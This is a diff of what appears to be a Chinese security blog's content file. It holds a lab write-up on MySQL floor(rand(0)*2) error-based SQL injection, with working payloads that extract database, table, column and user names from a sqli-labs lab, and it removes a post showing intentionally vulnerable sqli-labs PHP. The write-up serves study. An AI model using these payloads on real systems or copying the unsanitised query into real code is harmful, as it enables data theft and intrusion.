-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/10.png" alt></p>
-<p>添加随机因子，保证唯一性冲突报错的稳定性</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/11.png" alt></p>
-<p>在虚表建立的过程中产生的主键唯一性冲突报错的理解：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),floor(rand(0)*2)x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/12.png" alt></p>
-<p>这条payload在以information_schema.columns为基础建立虚表的过程中，由于information_schema.columns 表存在大量数据条目，故count(*)函数需要进行多次顺序的查询，然后以此作为虚表中的字段数据。<br>虚表中主键字段为x即floor(rand(0)*2),其在多次查询过程中，会产生0或者1，并且依照固定的顺序产生。<br>由此，在虚表建立的过程中：<br>当产生主键数据值为0的时候，count(*)为1，<br>当产生主键数据值为1的时候，count(*)为1，<br>当产生主键数据值为1的时候，虚表中已经存在为1的主键数据值，此时发生主键唯一性冲突，进而产生报错。</p>
-<h1 id="7、精准控制数据于主键位置泄露"><a href="#7、精准控制数据于主键位置泄露" class="headerlink" title="7、精准控制数据于主键位置泄露"></a>7、精准控制数据于主键位置泄露</h1><p>虚表已经建立，主键已经冲突，那么如何将数据通过主键位置泄露出来？<br>要想通过主键位置泄露数据，那么必须将目标sql语句嵌套到主键floor(rand(0)*2)中，<br>或者说由于查询的过程中目标sql执行的都是相同的结果，不同的只在于主键数据值的区别，直接将目标sql与主键通过concat()函数连接，一起成为新主键，也可以达到利用效果。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat(database(),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/13.png" alt></p>
-<p>sqli-labs实战环境验证：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取当前数据库</span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select database()),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/14.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取所有数据库</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/15.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据表</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select table_name from information_schema.tables  where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/16.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据字段</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/17.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据</span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select username from security.users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/18.png" alt></p>
-<h1 id="8、除了唯一性，非空性可以吗"><a href="#8、除了唯一性，非空性可以吗" class="headerlink" title="8、除了唯一性，非空性可以吗"></a>8、除了唯一性，非空性可以吗</h1><p>非空环境：</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/19.png" alt></p>
-<p>非空性限制不存在利用空间</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/20.png" alt></p>
-<h1 id="9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？"><a href="#9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？" class="headerlink" title="9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？"></a>9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat((select database()),0x3a,floor(rand(0)*2)) x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
-<p>该payload的本质其实是mysql在处理这类错误的时候，将主键键冲突的那个主键，报错抛出到错误信息中，从而使得我们可以通过floor(rand(0)*2)这个手段，结合information_schema.columns表，将目标信息通过主键位置泄露出来。</p>
-<p>那么，是否存在其他同性质的问题即在错误信息中包含有信息泄露？</p>
-<p>答案是有的！可以看到，当我尝试访问一个数据库中不存在的表的时候，其发生了报错，将当前库抛出到错误信息中，从而造成同样性质的问题的出现。</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/21.png" alt></p>
-<p>其利用与前面论证过的过程相同</p>
-<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/22.png" alt></p>
-<h1 id="10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？"><a href="#10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？" class="headerlink" title="10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？"></a>10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？</h1><p>我觉得，应该值得研究。这个漏洞与pwn中的格式化字符串漏洞类似。<br><a href="https://www.mysqlzh.com/" target="_blank" rel="noopener">https://www.mysqlzh.com/</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/u012364631/article/details/79408204" target="_blank" rel="noopener">https://blog.csdn.net/u012364631/article/details/79408204</a><br><a href="https://bugs.mysql.com/bug.php?id=82544" target="_blank" rel="noopener">https://bugs.mysql.com/bug.php?id=82544</a><br><a href="http://www.anquan.us/static/drops/tips-14312.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-14312.html</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -3220,6 +3147,69 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <h1 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h1><p>1、代码一定要写好注释。</p>
 <p>2、<br><img src="/%E4%B8%80%E6%AC%A1%E5%AF%B9mysql%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E5%B0%9D%E8%AF%95(xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)/a.png" alt></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>一条payload发生的事情(来自对报错注入的思考)</title>
+    <url>/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/</url>
+    <content><![CDATA[<h1 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h1><p>最近在重新整理复现<a href="https://github.com/RJ45mp/material/blob/master/MYSQL%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6.pdf" target="_blank" rel="noopener">MYSQL注入天书</a>,遇到了一条很有意思的报错注入的payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
+<p>记录一下，对这个payload的逆向理解。</p>
+<h1 id="2、环境"><a href="#2、环境" class="headerlink" title="2、环境"></a>2、环境</h1><p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/1.png" alt></p>
+<h1 id="3、约束与安全"><a href="#3、约束与安全" class="headerlink" title="3、约束与安全"></a>3、约束与安全</h1><p>在mysql中，无论是主键还是外键都有约束的设置，其属性有两个:非空性和唯一性，也即我们常说的非空唯一。唯一性表现为<br>在插入一条数据时，如果数据中的主键与表中某条数据的主键相同，则插入不成功，同时mysql会返回错误的信息。<br>在对错误信息的处理和返回过程中，mysql的底层代码实现将插入不成功的那条数据对应的主键返回到了错误信息里面，由此产生了一个安全性的问题—-暴露出了表中已存在的那条数据的主键。<br><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/2.png" alt></p>
+<h1 id="4、子查询控制主键位置"><a href="#4、子查询控制主键位置" class="headerlink" title="4、子查询控制主键位置"></a>4、子查询控制主键位置</h1><p>如何利用约束造成的错误带来的泄露问题？一个本质问题是：<br>我们能控制什么？我们能控制暴露出存在主键约束的表的已知数据的主键。(通过输入点，也就是构造与已知数据主键相同的数据插入，从而报错暴露出主键)<br>我们要获得什么？从控制点的形式来看(一个数据显示点)，我们要获得的只能是数据库中的数据信息。<br>怎么样才能通过我们能控制的来获取我们要获得的？一个方法是子查询控制主键位置。<br>子查询是指一个查询语句嵌套在另一个查询语句内部的查询。<br>在执行查询语句的时候，首先会执行子查询中的语句，然后将返回的结果作为外层查询的过滤条件。<br>我们期望，子查询语句为我们想要获取的信息的sql语句，外层sql语句存在含有主键唯一性的表，接着设置子查询语句于主键字段位置，构造主键唯一性冲突，将报错信息回显出来。<br>要做到这一步，需要解决两个问题：<br>1 在实际的攻击中，表的主键字段是未知的，获取主键字段将是一个难以解决的问题。<br>2 如何设置子查询语句与主键字段之间产生唯一性冲突并且将数据泄露出来，也是一个需要解决的问题。</p>
+<p>验证失败：</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/4.png" alt></p>
+<h1 id="5、聚合函数和group-by建立虚表"><a href="#5、聚合函数和group-by建立虚表" class="headerlink" title="5、聚合函数和group by建立虚表"></a>5、聚合函数和group by建立虚表</h1><p>解决第一个问题的思路在于：既然实表中主键字段存在未知可能，那么建立一个可以控制主键的虚表如何。<br>mysql中的虚拟表分为临时表、内存表和视图。内存表和视图显然不适合此种情景。<br>而临时表的建立有两种方式，一是以实表命名为tmp等，然后在使用完后手动删除。另一种是以聚合函数和group+by的方式建立临时表。<br>在<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/group-by-optimization.html" target="_blank" rel="noopener">mysql的中文文档中</a>有这么一句话：</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/5.png" alt></p>
+<p>由此，通过聚合函数和group+by建立一个可以控制主键的虚表，成为可能：</p>
+<p>可以看到，下面的sql语句在表<code>Rj45</code>的数据条数的基础上，利用count()函数和group by建立了一张主键为<code>database()</code>的虚表</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/6.png" alt></p>
+<p>由于<code>Rj45</code>表，不具有普遍性，参考mysql的基本库，修改为基本库中的表</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/3.png" alt></p>
+<p>mysql.user、information_schema.schemata、information_schema.tables和information_schema.columns</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/7.png" alt></p>
+<h1 id="6、随机因子构造主键唯一性冲突报错"><a href="#6、随机因子构造主键唯一性冲突报错" class="headerlink" title="6、随机因子构造主键唯一性冲突报错"></a>6、随机因子构造主键唯一性冲突报错</h1><p>第二个问题：如何设置子查询语句与主键字段之间产生唯一性冲突。<br>主键字段现在我们已经可以控制，需要构造唯一性冲突错误，那么就需要在虚表的建立过程中主键字段存在不一样的数值，并且在基于基本库中的表的数据条数不少于3条，如此在第三次查询建立虚表数据的过程中才会保证主键唯一性冲突的可能。</p>
+<p>故，第一：在mysql.user、information_schema.schemata、information_schema.tables和information_schema.columns中，根据数据条目的多少和普遍程度，冲突的可能性越来越大。(难说有没有存在一个mysql中只有一个库、一个表的存在的情况，不过一个字段就绝对不会出现)<br>保险起见，最好以information_schema.columns为基础，建立虚表。</p>
+<p>第二：如何使得虚表在建立的过程中，主键字段存在不一样的数值。<br>一个想法是利用mysql的随机函数rand(),该函数会在0和1之间随机产生数据</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/8.png" alt></p>
+<p>在随机函数的基础上添加rand()*2,然后结合floor()函数，该函数的作用是在数据中返回整数部分，就可以构造出随机的0和1两组数据</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/9.png" alt></p>
+<p>在验证过程中，发现虽然达到了预期的结果，可是报错存在不确定性(一会报错，一会正常)，并且报错的主键数据值也不稳定(一会为0，一会为1)。</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/10.png" alt></p>
+<p>添加随机因子，保证唯一性冲突报错的稳定性</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/11.png" alt></p>
+<p>在虚表建立的过程中产生的主键唯一性冲突报错的理解：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),floor(rand(0)*2)x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/12.png" alt></p>
+<p>这条payload在以information_schema.columns为基础建立虚表的过程中，由于information_schema.columns 表存在大量数据条目，故count(*)函数需要进行多次顺序的查询，然后以此作为虚表中的字段数据。<br>虚表中主键字段为x即floor(rand(0)*2),其在多次查询过程中，会产生0或者1，并且依照固定的顺序产生。<br>由此，在虚表建立的过程中：<br>当产生主键数据值为0的时候，count(*)为1，<br>当产生主键数据值为1的时候，count(*)为1，<br>当产生主键数据值为1的时候，虚表中已经存在为1的主键数据值，此时发生主键唯一性冲突，进而产生报错。</p>
+<h1 id="7、精准控制数据于主键位置泄露"><a href="#7、精准控制数据于主键位置泄露" class="headerlink" title="7、精准控制数据于主键位置泄露"></a>7、精准控制数据于主键位置泄露</h1><p>虚表已经建立，主键已经冲突，那么如何将数据通过主键位置泄露出来？<br>要想通过主键位置泄露数据，那么必须将目标sql语句嵌套到主键floor(rand(0)*2)中，<br>或者说由于查询的过程中目标sql执行的都是相同的结果，不同的只在于主键数据值的区别，直接将目标sql与主键通过concat()函数连接，一起成为新主键，也可以达到利用效果。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat(database(),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/13.png" alt></p>
+<p>sqli-labs实战环境验证：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取当前数据库</span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select database()),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/14.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取所有数据库</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/15.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据表</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select table_name from information_schema.tables  where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/16.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据字段</span><br><span class="line"></span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/17.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据</span><br><span class="line">http://192.168.3.21/Less-5/?id=1&apos; union select null,count(*),concat((select username from security.users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span><br></pre></td></tr></table></figure>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/18.png" alt></p>
+<h1 id="8、除了唯一性，非空性可以吗"><a href="#8、除了唯一性，非空性可以吗" class="headerlink" title="8、除了唯一性，非空性可以吗"></a>8、除了唯一性，非空性可以吗</h1><p>非空环境：</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/19.png" alt></p>
+<p>非空性限制不存在利用空间</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/20.png" alt></p>
+<h1 id="9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？"><a href="#9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？" class="headerlink" title="9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？"></a>9、除了主键约束冲突带来的泄露，还有其他同性质的问题吗？</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*),concat((select database()),0x3a,floor(rand(0)*2)) x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>
+<p>该payload的本质其实是mysql在处理这类错误的时候，将主键键冲突的那个主键，报错抛出到错误信息中，从而使得我们可以通过floor(rand(0)*2)这个手段，结合information_schema.columns表，将目标信息通过主键位置泄露出来。</p>
+<p>那么，是否存在其他同性质的问题即在错误信息中包含有信息泄露？</p>
+<p>答案是有的！可以看到，当我尝试访问一个数据库中不存在的表的时候，其发生了报错，将当前库抛出到错误信息中，从而造成同样性质的问题的出现。</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/21.png" alt></p>
+<p>其利用与前面论证过的过程相同</p>
+<p><img src="/%E4%B8%80%E6%9D%A1payload%E5%8F%91%E7%94%9F%E7%9A%84%E4%BA%8B%E6%83%85/22.png" alt></p>
+<h1 id="10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？"><a href="#10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？" class="headerlink" title="10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？"></a>10、除了这种在代码实现中动态嵌套错误回返回信息，还有其他可以控制的问题吗？</h1><p>我觉得，应该值得研究。这个漏洞与pwn中的格式化字符串漏洞类似。<br><a href="https://www.mysqlzh.com/" target="_blank" rel="noopener">https://www.mysqlzh.com/</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/u012364631/article/details/79408204" target="_blank" rel="noopener">https://blog.csdn.net/u012364631/article/details/79408204</a><br><a href="https://bugs.mysql.com/bug.php?id=82544" target="_blank" rel="noopener">https://bugs.mysql.com/bug.php?id=82544</a><br><a href="http://www.anquan.us/static/drops/tips-14312.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-14312.html</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -3671,98 +3661,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>由sqli-labs-Less17学习增删改形式下的sql注入</title>
-    <url>/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>mysql在对数据的处理中有增删改查四个操作。<br>而在sql注入中，往往常见的是<code>select</code>查询形式。<br>那么insert、delete、update呢？</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在ubuntu下搭建docker和开源vulstudy项目（其内含sqli-labs环境）。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo apt-get docker-compose -y</span><br><span class="line">sudo apt-get git -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">git clone https://github.com/c0ny1/vulstudy.git</span><br><span class="line">cd /vulstudy/sqli-labs</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>1、增</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table_name(column_name1,column_name2)values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name set column_name1=&apos;value1&apos;,column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/1.png" alt><br>2、删</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from table_name where column_name=&apos;value&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/2.png" alt><br>3、改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=&apos;value2&apos; where column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>sqli-labs-Less17代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">//echo $row;</span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">		$row1 = $row[&apos;username&apos;];  	</span><br><span class="line">		//echo &apos;Your Login name:&apos;. $row1;</span><br><span class="line">		$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">		if (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			//echo &quot; You password has been successfully updated &quot; ;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;</span><br><span class="line">		//echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	else  </span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">		//echo &quot;Bug off you Silly Dumb hacker&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
